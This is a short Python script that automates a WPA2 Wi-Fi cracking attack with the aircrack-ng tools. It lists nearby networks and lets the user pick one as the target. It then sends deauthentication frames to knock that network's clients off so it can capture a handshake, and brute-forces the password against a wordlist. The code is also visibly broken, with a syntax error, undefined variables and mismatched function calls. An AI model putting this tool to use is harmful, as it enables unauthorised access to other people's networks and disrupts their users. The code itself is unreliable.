import subprocess
import re
import time

def analyze_networks/interface):
    # Enable monitor mode
    subprocess.run(['sudo', 'airmon-ng', 'start', interface])
    
    # Scan networks
    output = subprocess.check_output(['sudo', 'airodump-ng', '-w', 'capture', '-c', channel, '--bssid', bssid, interface + 'mon'])
    
    # Extract SSID and channel
    ssid = re.findall(r'ESSID:.*', output.decode('utf-8'))[0].split(':')[1].strip()
    channel = re.findall(r'CH:.*', output.decode('utf-8'))[0].split(':')[1].strip()
    
    return ssid, channel

def crack_password(interface, bssid, channel, ssid):
    # Capture handshake
    subprocess.run(['sudo', 'airodump-ng', '-w', 'capture', '-c', channel, '--bssid', bssid, interface + 'mon'])
    
    # Deauthenticate clients to force handshake capture
    subprocess.run(['sudo', 'aireplay-ng', '-0', '4', '-a', bssid, interface + 'mon'])
    
    # Wait for handshake capture
    time.sleep(10)
    
    # Crack password
    subprocess.run(['aircrack-ng', '-w', 'wordlist.txt', '-e', ssid, 'capture-01.cap'])
    

def main():
    interface = input("Enter your wireless interface (e.g., wlan0): ")
    subprocess.run(['sudo', 'airmon-ng', 'start', interface])
    
    # Display list of available networks
    output = subprocess.check_output(['sudo', 'airodump-ng', interface + 'mon'])
    networks = re.findall(r'BSSID.*ESSID:.*CH:.*dBm.*WPA2.*PSK', output.decode('utf-8'))
    
    for i, network in enumerate(networks):
        bssid = re.findall(r'([0-9A-F:]+)', network)[0]
        essid = re.findall(r'ESSID:.*', network)[0].split(':')[1].strip()
        channel = re.findall(r'CH:.*', network)[0].split(':')[1].strip()
        
        print(f"{i+1}. BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")
    
    choice = int(input("Enter the number of the network you want to crack: "))
    
    bssid = re.findall(r'([0-9A-F:]+)', networks[choice-1])[0]
    channel = re.findall(r'CH:.*', networks[choice-1])[0].split(':')[1].strip()
    ssid = crack_password(interface, bssid, channel)
    
    print(f"Cracking password for {ssid}...")
    crack_password(interface, bssid, channel, ssid)
    

if __name__ == "__main__":
    main()
